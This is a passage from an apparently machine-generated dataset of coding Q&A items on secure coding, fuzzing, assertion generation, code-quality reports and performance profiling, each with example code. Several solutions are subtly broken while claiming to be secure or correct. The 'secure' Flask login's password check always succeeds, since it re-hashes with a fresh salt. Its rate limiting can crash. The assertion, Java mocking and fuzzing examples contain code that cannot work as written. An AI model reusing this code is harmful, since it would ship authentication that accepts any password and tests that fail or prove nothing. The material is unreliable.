database updates to ensure the security of third-party libraries.\n\n1. Implement a static code analysis tool using TypeScript to traverse the application's dependency graph and identify all used third-party libraries and their versions.\n```typescript\nimport * as fs from 'fs';\nimport * as path from 'path';\nimport * as depTree from 'dependency-tree';\n\ninterface LibraryInfo {\n  name: string;\n  version: string;\n}\n\nfunction analyzeDependencyTree(packageJsonPath: string): LibraryInfo[] {\n  const packageJson = require(packageJsonPath);\n  const dependencies = Object.keys(packageJson.dependencies || {});\n  const devDependencies = Object.keys(packageJson.devDependencies || {});\n\n  return [...dependencies, ...devDependencies].reduce((acc, depName) => {\n    const depPath = path.join(path.dirname(packageJsonPath), 'node_modules', depName, 'package.json');\n    if (fs.existsSync(depPath)) {\n      const depJson = require(depPath);\n      acc.push({ name: depName, version: depJson.version });\n      acc.push(...analyzeDependencyTree(depPath));\n    }\n    return acc;\n  }, []);\n}\n\nconst libraryInfos = analyzeDependencyTree('./package.json');\nconsole.log(libraryInfos);\n```\n1. Integrate dynamic analysis by creating a custom module that hooks into the application's require mechanism to detect and log loaded libraries during runtime.\n```typescript\nimport * as Module from 'module';\n\nconst loadedLibraries: string[] = [];\n\nfunction trackLoadedModules(module: Module) {\n  if (module.filename.includes('node_modules')) {\n    const libraryName = path.basename(module.filename, path.extname(module.filename));\n    loadedLibraries.push(libraryName);\n  }\n}\n\n// Monkey-patch the original require function\nconst originalRequire = Module.prototype.require;\nModule.prototype.require = function (request: string) {\n  trackLoadedModules(this);\n  return originalRequire.apply(this, arguments);\n};\n\n// Start the app\nrequire('./app.js');\nconsole.log(loadedLibraries);\n```\n1. Create a vulnerability scanner that compares the identified libraries with a vulnerability database, like the NPM Audit API or the OWASP Dependency-Check, to flag known vulnerabilities.\n```typescript\nimport axios from 'axios';\n\nasync function scanForVulnerabilities(libraries: LibraryInfo[]): Promise<Map<string, string>> {\n  const vulnerableLibraries = new Map<string, string>();\n\n  for (const lib of libraries) {\n    try {\n      const response = await axios.get(`https://some-vuln-api.com/lookup?name=${lib.name}&version=${lib.version}`);\n      if (response.data.vulnerabilities.length > 0) {\n        vulnerableLibraries.set(lib.name, JSON.stringify(response.data.vulnerabilities));\n      }\n    } catch (error) {\n      console.error(`Failed to check ${lib.name}@${lib.version}: ${error.message}`);\n    }\n  }\n\n  return vulnerableLibraries;\n}\n\n(async () => {\n  const vulnerableLibs = await scanForVulnerabilities(libraryInfos);\n  if (vulnerableLibs.size > 0) {\n    console.log('Vulnerable libraries:');\n    for (const [libName, vulnerabilities] of vulnerableLibs.entries()) {\n      console.log(`${libName}: ${vulnerabilities}`);\n    }\n  } else {\n    console.log('No vulnerable libraries found.');\n  }\n})();\n```\nThis solution provides a multi-layered approach to security review, incorporating static, dynamic, and external data for a more comprehensive assessment.\n\nQuestion 2:\nDesign a framework in Python"}, {"L2_TASK": "Security Review", "L3_TASK": "Secure coding training", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a secure function in Python that takes a user's input as a password and checks if it meets specific complexity criteria, such as containing at least one uppercase letter, one lowercase letter, one digit, and one special character.\n\n```python\ndef is_password_secure(password: str) -> bool:\n    complexity_criteria = [\n        any(char.isupper() for char in password),\n        any(char.islower() for char in password),\n        any(char.isdigit() for char in password),\n        any(not char.isalnum() for char in password)\n    ]\n    return all(criteria for criteria in complexity_criteria)\n\n# Test the function\npasswords = [\"Secure123!\", \"insecure\", \"Secure123\", \"Secure!23\"]\nfor p in passwords:\n    print(f\"Password: {p}, Secure: {is_password_secure(p)}\")\n```\n\nConcept: Secure coding practices\n\nQuestion 2:\nProblem: Create a Java method that securely stores a password as a hashed value using the bcrypt algorithm, ensuring resistance against common attacks like rainbow tables.\n\n```java\nimport org.mindrot.jbcrypt.BCrypt;\n\npublic class SecureStorage {\n    public static String hashPassword(String password) {\n        return BCrypt.hashpw(password, BCrypt.gensalt());\n    }\n\n    public static boolean validatePassword(String plainPassword, String hashedPassword) {\n        return BCrypt.checkpw(plainPassword, hashedPassword);\n    }\n\n    public static void main(String[] args) {\n        String plainPassword = \"SecurePassword123!\";\n        String hashedPassword = hashPassword(plainPassword);\n        System.out.println(\"Hashed Password: \" + hashedPassword);\n\n        boolean isValid = validatePassword(plainPassword, hashedPassword);\n        System.out.println(\"Is Valid: \" + isValid);\n    }\n}\n```\n\nConcept: Secure coding practices and bcrypt hashing"}, {"L2_TASK": "Security Review", "L3_TASK": "Secure coding training", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Design a complex and secure authentication system that utilizes multi-factor authentication (MFA) with biometric and hardware token support, while also implementing secure password storage and rate limiting mechanisms. The system should be able to handle concurrent user sessions and prevent brute force attacks.\n\nSolution:\nConcept: Secure Coding, Authentication, Multi-Factor Authentication, Biometric Security, Rate Limiting\n\nLanguage: Python (using Flask and its extensions)\n\nExample Code:\n```python\nfrom flask import Flask, request, session\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField, BooleanField\nfrom wtforms.validators import InputRequired, Length, EqualTo\nfrom cryptography.fernet import Fernet\nimport hashlib\nimport os\nimport time\nimport random\n\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\n\n# Mock biometric and hardware token services (replace with actual implementation)\ndef verify_biometric(fingerprint):\n    return \"valid\" == fingerprint\n\ndef verify_token(token):\n    return \"valid\" == token\n\nclass LoginForm(FlaskForm):\n    username = StringField('Username', validators=[InputRequired(), Length(min=4, max=20)])\n    password = PasswordField('Password', validators=[InputRequired()])\n    remember_me = BooleanField('Remember Me')\n\n# Secure password storage\ndef store_password(username, password):\n    salt = os.urandom(16)\n    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)\n    return f\"{salt.hex()}:{key.hex()}\"\n\n# Check password\ndef check_password(username, entered_password):\n    password_data = store_password(username, entered_password).split(':')\n    salt = bytes.fromhex(password_data[0])\n    key = bytes.fromhex(password_data[1])\n    return hashlib.pbkdf2_hmac('sha256', entered_password.encode(), salt, 100000) == key\n\n# Rate limiting\nLIMIT = 5\nPERIOD = 60  # seconds\nattempts = {}\n\ndef is_rate_limited(username):\n    if username in attempts:\n        if time.time() - attempts[username][1] < PERIOD:\n            return attempts[username][0] >= LIMIT\n        else:\n            del attempts[username]\n    attempts[username] = [1, time.time()]\n    return False\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    form = LoginForm()\n\n    if form.validate_on_submit():\n        if check_password(form.username.data, form.password.data) and not is_rate_limited(form.username.data):\n            if verify_biometric('mock_fingerprint') and verify_token('mock_token'):\n                session['logged_in'] = True\n                return 'Logged in successfully!'\n        else:\n            attempts[form.username.data][0] += 1\n            return 'Invalid credentials or rate limit exceeded. Try again later.'\n\n    return render_template('login.html', form=form)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nQuestion 2:\nProblem: Implement a secure file upload system that prevents malicious file types, detects and removes any hidden malware within the files, and stores the files in an encrypted form on the server using a key management system. Additionally, ensure that the system can handle large file uploads with a progress bar for the user.\n\nSolution:\nConcept: Secure Coding, File Upload, Malware Detection, Encryption, Key Management\n\nLanguage: Python (using Django, ClamAV, and cryptography)\n\nExample Code:\n```python\n# settings.py\nMEDIA_ROOT = '/path/to/media/files/'\nMEDIA_URL = '/media/'\n\n# requirements.txt\ndjango\ndjango-storages\nboto3\ncryptography\npython-clamav\n\n# models.py\nfrom django.db import models\nfrom django.core.files.storage import default_storage\n\nclass SecureFile(models.Model):\n    file = models.FileField(upload_to='uploads/')\n    uploaded_at = models.DateTimeField(auto_now_add=True)\n\n# views.py\nfrom django.shortcuts import render\nfrom django.views import View\nfrom django.http import JsonResponse\nimport os\nimport boto3\nfrom cryptography.fernet import Fernet\nfrom clamav import ClamAV\n\nclass SecureFileUploadView(View):\n    def post(self, request):\n        if 'file' not in request.FILES:\n            return JsonResponse({'error': 'No file uploaded'}, status=400)\n\n        file = request.FILES['file']\n        filename = file.name\n\n        # Check file type and malware\n        clam = ClamAV()\n        if clam.scan(file) or not filename.endswith(('.txt', '.pdf', '.jpg', '.png')):\n            return JsonResponse({'error': 'Malicious or unsupported file type'}, status=400)\n\n        # Generate encryption key\n        key = Fernet.generate_key()\n        f = Fernet(key)\n\n        # Encrypt the file\n        encrypted_file = default_storage.save(filename, ContentFile(f.encrypt(file.read())))\n\n        # Store key in a secure key management system (e.g., AWS KMS)\n        s3 = boto3.client('s3')\n        s3.upload_fileobj(f.open(encrypted_file.path, 'rb'), 'key-bucket', os.path.basename(encrypted_file.path))\n\n        return JsonResponse({'success': True, 'file_name': filename})\n\n# forms.py\nfrom django import forms\n\nclass FileUploadForm(forms.Form):\n    file = forms.FileField()\n\n# urls.py\nfrom django.urls import path\nfrom .views import SecureFileUploadView\n\nurlpatterns = [\n    path('upload/', SecureFileUploadView.as_view(), name='file_upload'),\n]\n```\nNote: This code is a simplified representation, and a complete implementation would require additional logic for handling large file uploads with progress bars, integrating a key management system, and properly handling error scenarios."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Code fuzzing", "Complexity_Level": "medium", "Response": "Since \"Quality Assurance\" is not listed in the provided JSON, I will assume you want a question related to a domain that has a connection with testing. In this case, I'll use \"Programming Language Concepts\" and the concept of \"Function\" to create a medium-level problem related to code fuzzing.\n\nProblem: Develop a Python function that takes a target function and a list of inputs as parameters. The function should generate random inputs for the target function, using fuzzing techniques, to detect potential issues like crashes, errors, or unexpected behavior.\n\n```python\nimport random\nimport string\nfrom typing import Callable, List\n\ndef fuzz_target(target_function: Callable[[str], None], input_list: List[str], min_len: int, max_len: int, char_set: str):\n    for _ in range(100):  # Run fuzzing for 100 iterations\n        input_length = random.randint(min_len, max_len)\n        fuzz_input = ''.join(random.choice(char_set) for _ in range(input_length))\n        \n        # Try executing the target function with the fuzzed input\n        try:\n            target_function(fuzz_input)\n        except Exception as e:\n            print(f\"Detected issue with input '{fuzz_input}': {e}\")\n\n# Example target function that has a bug with long inputs\ndef faulty_string_processing(s: str):\n    if len(s) > 100:\n        print(s[:100])  # Truncates string, causing issues with long inputs\n\n# Fuzz the example function with alphanumeric characters\ninput_list = ['short', 'medium', 'longish']\nfuzz_target(faulty_string_processing, input_list, 1, 200, string.ascii_letters + string.digits)\n```\n\nConcept: \"Function\"\n\nExplanation: The `fuzz_target` function acts as a fuzz tester by generating random inputs based on the provided character set and length constraints. It calls the target function with each fuzzed input and catches any exceptions that may occur, indicating potential issues. In the example, `faulty_string_processing` is a function with a bug that causes problems when handling long inputs. The fuzzing process can help uncover such issues by generating inputs that push the limits of the function's logic."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Code fuzzing", "Complexity_Level": "extremely difficult", "Response": "As a senior expert in Quality Assurance with 20 years of experience, I understand that \"Code fuzzing\" is a technique for finding software vulnerabilities by providing random or invalid inputs to the code. Here are two extremely difficult problems and their solutions using Python:\n\n**Problem 1: Fuzzing a complex web application's API endpoint with multiple nested structures and different input types**\n\n**Concept:** Code Fuzzing, REST APIs\n\n**Problem Description:**\nCreate a fuzzing tool to test a complex API endpoint that accepts a JSON payload with nested objects, arrays, and multiple data types (strings, integers, booleans, and dates). The tool should be able to generate semi-valid payloads with random data to find potential issues like null pointer exceptions, type mismatches, or buffer overflows.\n\n**Solution:**\n\n```python\nimport json\nimport random\nimport string\nimport requests\n\ndef random_string(length):\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\n\ndef random_int(min_val, max_val):\n    return random.randint(min_val, max_val)\n\ndef random_boolean():\n    return bool(random.getrandbits(1))\n\ndef random_date(start, end):\n    return start + (end - start) * random.random()\n\ndef generate_nested_payload(depth=3):\n    if depth == 0:\n        return random_string(10)\n\n    payload = {}\n    for _ in range(random.randint(1, 5)):\n        key = random_string(10)\n        value = None\n\n        if random.randint(1, 3) == 1:\n            value = random_string(random.randint(5, 20))\n        elif random.randint(1, 3) == 2:\n            value = random_int(-100, 100)\n        elif random.randint(1, 3) == 3:\n            value = random_boolean()\n        elif random.randint(1, 3) == 4:\n            start = '1970-01-01'\n            end = '2022-12-31'\n            value = random_date(start, end).isoformat()\n        else:\n            value = generate_nested_payload(depth - 1)\n\n        payload[key] = value\n\n    return payload\n\ndef fuzz_api(api_url):\n    for _ in range(100):\n        payload = generate_nested_payload()\n        response = requests.post(api_url, json=payload)\n        if response.status_code != 200:\n            print(f\"Payload triggered error: {payload}, Response: {response.status_code}\")\n\nfuzz_api('https://example.com/api/endpoint')\n```\n\n**Problem 2: Fuzzing a binary file parser with memory safety checks**\n\n**Concept:** Code Fuzzing, Binary Files\n\n**Problem Description:**\nDevelop a fuzzing tool to test a binary file parser that reads custom file formats with varied structures. The tool should generate corrupt and malformed binary files to identify potential memory safety issues like buffer overflows, null pointer dereferences, or use-after-free vulnerabilities.\n\n**Solution:**\n\n```python\nimport os\nimport random\nimport struct\n\ndef generate_corrupted_binary_file(file_path, structure):\n    with open(file_path, 'wb') as f:\n        for field in structure:\n            if field['type'] == 'string':\n                data_len = field['length']\n                data = os.urandom(data_len)\n                f.write(struct.pack(f'>I{data_len}s', data_len, data))\n            elif field['type'] == 'integer':\n                data = random.randint(-1000, 1000)\n                f.write(struct.pack('>I', data))\n            elif field['type'] == 'float':\n                data = random.uniform(-100.0, 100.0)\n                f.write(struct.pack('>f', data))\n            else:\n                raise ValueError('Unsupported data type')\n\ndef fuzz_binary_parser(parser, file_structure, fuzzing_dir):\n    for _ in range(100):\n        temp_file = os.path.join(fuzzing_dir, f'fuzz_{random.randint(1, 10000)}.bin')\n        generate_corrupted_binary_file(temp_file, file_structure)\n        try:\n            parser(temp_file)\n        except Exception as e:\n            print(f\"File '{temp_file}' triggered error: {e}\")\n\n# Assuming `parse_custom_file` is the binary file parser function\nfile_structure = [\n    {'type': 'string', 'length': 20},\n    {'type': 'integer', 'length': 4},\n    {'type': 'float', 'length': 4},\n    {'type': 'string', 'length': 10}\n]\n\nfuzz_binary_parser(parse_custom_file, file_structure, '/tmp/fuzzing')\n```\n\nThese solutions demonstrate how to create advanced fuzzing tools for complex scenarios, exercising the code with diverse and potentially problematic inputs. While Python is used here for simplicity, similar approaches can be applied to other programming languages like C, C++, or Rust."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Assertion Generation", "Complexity_Level": "medium", "Response": "The given domain JSON doesn't contain a direct category or subcategory for \"Quality Assurance\" or \"Assertion Generation\". However, assertion generation is a practice used in software development to ensure the correct behavior of code. It can be considered indirectly related to the \"Programming Language Concepts\" category and the concept of \"Function\" and \"Control\".\n\nHere are two medium-level complexity problems and their solutions in Python:\n\nProblem 1:\nGiven a function to calculate the factorial of a non-negative integer, implement assertion statements to validate the input and the output.\n\nSolution:\n```python\ndef factorial(n):\n    if not isinstance(n, int) or n < 0:\n        raise ValueError(\"Input should be a non-negative integer.\")\n    \n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n-1)\n\n# Testing the factorial function with assertion statements\ndef test_factorial():\n    assert factorial(-1) == \"Input should be a non-negative integer.\"\n    assert factorial(0) == 1\n    assert factorial(1) == 1\n    assert factorial(5) == 120\n    try:\n        factorial(\"test\")\n    except ValueError as e:\n        assert str(e) == \"Input should be a non-negative integer.\"\n\ntest_factorial()\n```\nConcept: Function, Control\n\nProblem 2:\nCreate a function to parse a comma-separated string into a list and add assertion statements to validate the input and the output.\n\nSolution:\n```python\ndef parse_csv(input_string):\n    if not isinstance(input_string, str):\n        raise ValueError(\"Input should be a string.\")\n    \n    result = input_string.split(',')\n    \n    for item in result:\n        if not isinstance(item, str) or len(item.strip()) == 0:\n            raise ValueError(\"Invalid CSV content. Expected non-empty strings separated by commas.\")\n    \n    return result\n\n# Testing the parse_csv function with assertion statements\ndef test_parse_csv():\n    assert parse_csv(\"apple,banana,grape\") == [\"apple\", \"banana\", \"grape\"]\n    try:\n        parse_csv(123)\n    except ValueError as e:\n        assert str(e) == \"Input should be a string.\"\n    try:\n        parse_csv(\"apple, ,grape\")\n    except ValueError as e:\n        assert str(e) == \"Invalid CSV content. Expected non-empty strings separated by commas.\"\n\ntest_parse_csv()\n```\nConcept: Function, Control, Strings"}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Assertion Generation", "Complexity_Level": "extremely difficult", "Response": "The given JSON does not contain a specific category for \"Quality Assurance\" or \"Assertion Generation\". However, assertion generation is a crucial aspect of software testing, and it can be applied to various programming domains. Here, I will create a problem related to a complex testing scenario in the \"Programming Language Concepts\" category, focusing on \"Polymorphism\" and \"Generics\".\n\nQuestion 1: Develop a unit test suite for a complex class hierarchy with polymorphism and generics, where the base class has multiple derived classes with overridden methods, and each derived class implements a specific generic interface for handling different data types.\n\nConcept: Polymorphism and Generics\n\nProblem:\nYou have a base class `Animal` and several derived classes like `Dog`, `Cat`, `Fish`, each implementing a generic interface `IAnimalBehavior<T>`. The `IAnimalBehavior<T>` interface has a generic method `DisplayInfo(T data)`. Implement a unit test suite using a testing framework like JUnit (Java) to ensure that each derived class's `DisplayInfo` method is called correctly with the appropriate data type.\n\nSolution (Java with JUnit):\n\n```java\nimport org.junit.Test;\nimport static org.junit.Assert.assertEquals;\nimport static org.mockito.Mockito.*;\n\ninterface IAnimalBehavior<T> {\n    void displayInfo(T data);\n}\n\nabstract class Animal {\n    public abstract IAnimalBehavior<?> getBehavior();\n}\n\nclass Dog extends Animal implements IAnimalBehavior<String> {\n    @Override\n    public void displayInfo(String data) {\n        System.out.println(\"Dog says: \" + data);\n    }\n}\n\nclass Cat extends Animal implements IAnimalBehavior<Integer> {\n    @Override\n    public void displayInfo(Integer data) {\n        System.out.println(\"Cat meows: \" + data);\n    }\n}\n\nclass Fish extends Animal implements IAnimalBehavior<Double> {\n    @Override\n    public void displayInfo(Double data) {\n        System.out.println(\"Fish swims: \" + data);\n    }\n}\n\npublic class AnimalTest {\n    @Test\n    public void testAnimalBehavior() {\n        // Create test instances\n        Animal dog = new Dog();\n        Animal cat = new Cat();\n        Animal fish = new Fish();\n\n        // Mock the interface methods for verification\n        IAnimalBehavior<String> mockDogBehavior = mock(IAnimalBehavior.class);\n        IAnimalBehavior<Integer> mockCatBehavior = mock(IAnimalBehavior.class);\n        IAnimalBehavior<Double> mockFishBehavior = mock(IAnimalBehavior.class);\n\n        // Replace the original methods with the mocked ones\n        dog.getBehavior = () -> mockDogBehavior;\n        cat.getBehavior = () -> mockCatBehavior;\n        fish.getBehavior = () -> mockFishBehavior;\n\n        // Call the methods to test\n        dog.getBehavior().displayInfo(\"Woof\");\n        cat.getBehavior().displayInfo(3);\n        fish.getBehavior().displayInfo(2.5);\n\n        // Verify method invocations\n        verify(mockDogBehavior).displayInfo(\"Woof\");\n        verify(mockCatBehavior).displayInfo(3);\n        verify(mockFishBehavior).displayInfo(2.5);\n\n        // Reset mocks to avoid interference with other tests\n        reset(mockDogBehavior, mockCatBehavior, mockFishBehavior);\n    }\n}\n```\n\nQuestion 2: Design a testing strategy for a highly concurrent system using mock objects and assertion libraries in Python, where multiple threads access shared resources and enforce specific ordering constraints.\n\nConcept: Concurrency, Mocking, and Assertions\n\nProblem:\nYou have a Python application with a `ThreadPoolExecutor` that executes tasks which access a shared `Resource` class. The `Resource` class has a method `processData()` that must be called in the order tasks are submitted to the executor. Write a test that ensures the `processData()` method is called in the correct order, even under concurrent execution.\n\nSolution (Python with unittest.mock and threading):\n\n```python\nimport unittest\nfrom unittest.mock import MagicMock, call\nfrom concurrent.futures import ThreadPoolExecutor\nimport threading\n\nclass Resource:\n    def processData(self, data):\n        pass\n\nclass TestConcurrencyOrder(unittest.TestCase):\n    def test_process_data_order(self):\n        # Create a mock resource and executor\n        mock_resource = MagicMock(spec=Resource)\n        executor = ThreadPoolExecutor(max_workers=5)\n\n        # Define task data and expected order\n        task_data = [(1, \"data1\"), (2, \"data2\"), (3, \"data3\")]\n        expected_order = [(1, \"data1\"), (2, \"data2\"), (3, \"data3\")]\n\n        # Function to submit tasks in separate threads\n        def submit_tasks():\n            for task_id, data in task_data:\n                executor.submit(mock_resource.processData, data)\n\n        # Start threads and join them\n        threads = [threading.Thread(target=submit_tasks) for _ in range(3)]\n        for thread in threads:\n            thread.start()\n        for thread in threads:\n            thread.join()\n\n        # Verify the mock's method calls\n        mock_resource.processData.assert_has_calls(expected_order, any_order=False)\n\nif __name__ == '__main__':\n    unittest.main()\n```\nIn this solution, we create a mock `Resource` object and use the `ThreadPoolExecutor` to submit tasks that call its `processData()` method. The test ensures that the method is called with the correct data in the correct order, even in a concurrent environment."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Automated code quality reports", "Complexity_Level": "medium", "Response": "Since \"Quality Assurance\" and \"Automated code quality reports\" are not explicitly mentioned in the provided JSON, I will create a relevant problem in a related domain: \"Programming Language Concepts\" with a focus on \"Static Analysis Tools\" which are commonly used to generate automated code quality reports.\n\nQuestion 1:\n**Problem:**\nYour team is using a code quality tool (like ESLint for JavaScript) to enforce coding standards and identify potential issues in the codebase. However, you've noticed that some team members are ignoring the tool's suggestions, leading to inconsistencies in the code. Write a script that integrates the ESLint tool into a continuous integration (CI) pipeline to automatically check code quality and fail the build if there are any unresolved ESLint issues.\n\n**Solution:**\nTo integrate ESLint into a CI pipeline, you can use a CI provider's hooks or commands. Here's an example using a GitHub Actions workflow for JavaScript:\n\n```yaml\nname: ESLint Check\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout repository\n      uses: actions/checkout@v2\n    - name: Setup Node.js\n      uses: actions/setup-node@v2\n      with:\n        node-version: '14'\n    - name: Install dependencies\n      run: npm ci\n    - name: Lint code\n      run: npm run lint\n      env:\n        ESLINT_NO_DEV_ERRORS: true\n    - name: Fail build on lint errors\n      if: ${{ failure() }}\n      run: exit 1\n```\n\nIn the repository, you would have an `npm` script in your `package.json` file to run ESLint:\n\n```json\n{\n  \"scripts\": {\n    \"lint\": \"eslint --ext .js,.jsx,.ts,.tsx src\"\n  },\n  \"devDependencies\": {\n    \"eslint\": \"^7.32.0\",\n    \"eslint-config-airbnb-base\": \"^14.2.1\",\n    \"eslint-plugin-import\": \"^2.25.2\"\n  }\n}\n```\n\nQuestion 2:\n**Problem:**\nYour company uses a Python codebase and wants to enforce a consistent code style across all projects. They've chosen Pylint as the static analysis tool. Write a script that runs Pylint on the codebase and generates a code quality report in XML format, which can be later integrated into a CI/CD pipeline for further analysis.\n\n**Solution:**\nTo run Pylint and generate an XML report, you can create a `Makefile` in the root of your Python project:\n\n```makefile\n.PHONY: lint\nlint:\n    pylint --output-format=xml --rcfile=pylintrc src > pylint_report.xml\n```\n\nHere, `pylintrc` is a configuration file where you can define custom Pylint settings. Create a basic `.pylintrc` file:\n\n```ini\n[MASTER]\ndisable=import-error\n\n[REPORTS]\noutput-format=xml\noutput-file=pylint_report.xml\n```\n\nTo integrate this into a CI/CD pipeline (using GitHub Actions as an example), create a `yaml` file for the workflow:\n\n```yaml\nname: Pylint Check\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout repository\n      uses: actions/checkout@v2\n    - name: Setup Python\n      uses: actions/setup-python@v2\n      with:\n        python-version: '3.8'\n    - name: Install dependencies\n      run: pip install -r requirements.txt\n    - name: Install Pylint\n      run: pip install pylint\n    - name: Run Pylint and generate report\n      run: make lint\n    - name: Check for linting errors\n      run: grep -q \"Your code has been rated\" pylint_report.xml || exit 1\n```\n\nThis workflow will run Pylint, generate an XML report, and fail the build if there are any linting issues."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Automated code quality reports", "Complexity_Level": "extremely difficult", "Response": "**Question 1:**\nCreate a comprehensive automated code quality report system that integrates with a continuous integration/continuous deployment (CI/CD) pipeline, detecting complex architectural and design issues, as well as enforcing strict coding standards across multiple languages.\n\n**Solution:**\n Concept: Automated Code Quality Report System\n\nTo create a sophisticated automated code quality report system, we can use a combination of tools like SonarQube, ESLint, and PyLint for static code analysis, along with a custom-built plugin for CI/CD integration. Here's an example using a Python-based CI/CD pipeline with Jenkins, SonarQube, and custom scripts.\n\n1. Install and set up Jenkins, SonarQube, and required plugins.\n2. Create a Jenkinsfile for defining the pipeline:\n\n```groovy\npipeline {\n    agent any\n\n    stages {\n        stage('Checkout') {\n            steps {\n                git 'https://github.com/your-repo.git'\n            }\n        }\n\n        stage('Build') {\n            steps {\n                sh 'mvn clean install'\n            }\n        }\n\n        stage('Code Quality Analysis') {\n            steps {\n                sh 'mvn sonar:sonar -Dsonar.projectKey=your_project_key -Dsonar.login=your_sonar_token'\n            }\n        }\n\n        stage('Custom Analysis') {\n            steps {\n                script {\n                    def qualityReport = sh(script: 'python analyze_custom.py', returnStdout: true).trim()\n                    echo \"Custom quality report: $qualityReport\"\n                }\n            }\n        }\n    }\n}\n```\n\n1. Set up SonarQube to analyze your projects with defined quality profiles for multiple languages (Java, Python, etc.).\n2. Create a custom Python script `analyze_custom.py` to perform additional checks and integrate with SonarQube:\n\n```python\nimport os\nimport subprocess\n\ndef run_custom_analysis():\n    # Run ESLint for JavaScript\n    js_results = subprocess.run(['eslint', '--ext', '.js,.jsx', 'src/js'], capture_output=True, text=True)\n    # Run PyLint for Python\n    py_results = subprocess.run(['pylint', 'src/py'], capture_output=True, text=True)\n\n    all_issues = js_results.stdout + py_results.stdout\n\n    # Integrate with SonarQube API to report issues\n    sonar_api_report(all_issues)\n\ndef sonar_api_report(issues):\n    # Implement code to connect to SonarQube API, create new issues, and associate them with the project\n    pass\n\nif __name__ == \"__main__\":\n    run_custom_analysis()\n```\n\nThis solution demonstrates an advanced setup that combines a CI/CD pipeline with SonarQube for multi-language code analysis, and a custom script using ESLint and PyLint for additional checks. The custom script can be extended to include more complex architectural and design issue detection.\n\n**Question 2:**\nDesign an AI-driven automated code quality report system that predicts potential bugs, security vulnerabilities, and performance bottlenecks using machine learning models trained on a large corpus of code.\n\n**Solution:**\nConcept: AI-Driven Code Quality Report System\n\nTo create an AI-driven code quality report system, we'll use machine learning models trained on a vast dataset of code snippets and their corresponding issues. The system will analyze code in real-time and provide predictions. Here's a high-level overview:\n\n1. Collect and preprocess a large dataset of code snippets, bug reports, security vulnerabilities, and performance issues.\n2. Train multiple machine learning models using different algorithms (e.g., Random Forest, Gradient Boosting, or Neural Networks) for bug prediction, security, and performance analysis.\n3. Build a code analysis API using a suitable programming language (e.g., Python with Flask) that integrates these models.\n\n```python\nfrom flask import Flask, request, jsonify\nfrom sklearn.externals import joblib\n\napp = Flask(__name__)\nmodels = {\n    'bug_prediction': joblib.load('bug_prediction_model.pkl'),\n    'security_analysis': joblib.load('security_analysis_model.pkl'),\n    'performance_analysis': joblib.load('performance_analysis_model.pkl')\n}\n\n@app.route('/analyze', methods=['POST'])\ndef code_analysis():\n    code = request.json['code']\n    features = extract_features(code)  # Implement feature extraction from code\n    predictions = {\n        'bug_prediction': models['bug_prediction'].predict(features['bug']),\n        'security_analysis': models['security_analysis'].predict(features['security']),\n        'performance_analysis': models['performance_analysis'].predict(features['performance'])\n    }\n    return jsonify(predictions)\n\nif __name__ == '__main__':\n    app.run()\n```\n\n1. Integrate the API into your CI/CD pipeline or development environment (e.g., IDE plugins) to provide real-time feedback during code development.\n\nThis solution demonstrates the use of AI-driven models to predict potential issues in code, enhancing the traditional static code analysis approach. Note that the actual implementation involves significant data preprocessing, feature engineering, and model training, which are not shown here."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Performance profiling", "Complexity_Level": "medium", "Response": "Question 1: A web application is experiencing slow response times, and the development team suspects inefficient database queries. You need to profile the application to identify the slow-performing queries.\n\nConcept: Performance Profiling\n\nSolution:\nWe can use a tool like Python's `cProfile` to profile the application's functions, including database access. Here's a simplified example using Python and a hypothetical ORM (Object-Relational Mapping) library called `pyorm` that interacts with a SQL database:\n\n```python\nimport cProfile\nimport pyorm\n\ndef fetch_data(user_id):\n    db = pyorm.connect('your_database_connection_string')\n    user = db.User.get(user_id)\n    # Assume this method fetches related data for a user, which can be slow\n    user.load_related_data()\n    return user\n\ndef main():\n    user_id = 123\n    cProfile.runctx('fetch_data(user_id)', globals(), locals(), filename='profile_results.txt')\n\nif __name__ == '__main__':\n    main()\n```\n\nAfter running the script, the `profile_results.txt` file will contain a detailed report on the execution time of each function. By analyzing the report, we can identify which part of the `fetch_data` function, especially database interactions, is causing the slow performance.\n\nQuestion 2: A mobile app is consuming excessive battery while running in the background. You need to create a script to profile the app's CPU and memory usage over time.\n\nConcept: Mobile App Performance Profiling\n\nSolution:\nFor an Android app, we can use the Android Debug Bridge (ADB) to log CPU and memory usage. Here's an example using a shell script:\n\n```bash\n#!/bin/bash\n\n# Get the package name of your app (e.g., com.example.myapp)\nAPP_PACKAGE=com.example.myapp\n\n# Start monitoring CPU usage\necho \"Starting CPU monitoring...\"\nadb shell \"dumpsys cpuinfo | grep -E '^ *$(adb shell pgrep -f $APP_PACKAGE):.*$'\"\n\n# Start monitoring memory usage\necho \"Starting memory monitoring...\"\nadb shell \"dumpsys meminfo $APP_PACKAGE\"\n\n# Sleep for some time (e.g., 10 seconds) to collect data\nsleep 10\n\n# Stop monitoring\necho \"Stopping monitoring...\"\nadb shell \"am force-stop $APP_PACKAGE\"\n```\n\nThis script will print the CPU and memory usage of the app every second for 10 seconds. Analyzing this data can help identify any spikes or unusual patterns that could indicate performance issues. For a more detailed analysis, you can use Android Studio's built-in profiler or other dedicated tools."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Performance profiling", "Complexity_Level": "extremely difficult", "Response": "Question 1: \n\nGiven a complex, multi-threaded server application written in Java, designed to handle thousands of concurrent connections with heavy data processing, find and optimize the performance bottlenecks to increase throughput and reduce latency. The application is currently experiencing high CPU utilization and occasional memory leaks.\n\n**Concept**: Performance 